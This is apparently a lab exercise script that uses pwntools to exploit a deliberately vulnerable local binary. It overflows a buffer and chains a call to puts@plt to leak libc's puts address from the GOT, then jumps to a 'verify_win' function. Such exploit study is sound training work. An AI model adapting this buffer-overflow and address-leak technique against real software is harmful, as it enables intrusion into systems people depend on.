from pwn import *


binary = "../x86_binaries/x86_no_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
vuln_addr = int(p.recvline().strip(),16)
print(f'vuln(): {hex(vuln_addr)}')

actual_puts_addr = int(p.recvline().strip(),16)

p.recvline() # read "str addr:"

# send GOT address
p.sendline(hex(elf.got['puts']).encode())
sleep(0.5)

payload = flat(
    b'a'*0x28,
    p64(elf.plt['puts']),                       # call puts@plt to leak libc
    p64(elf.sym['verify_win']),                 # go to verify_win to demonstrate process continuation
)
p.sendline(payload)

# recover leaked puts address
leaked_puts = int.from_bytes(p.recvline()[:-1], 'little')
print(f'leaked puts(): {hex(leaked_puts)}')
assert actual_puts_addr == leaked_puts

process_continuation = p.recvline()
assert "You win!\n" == process_continuation.decode()

print("All assertions passed, exploit successful!")

p.close()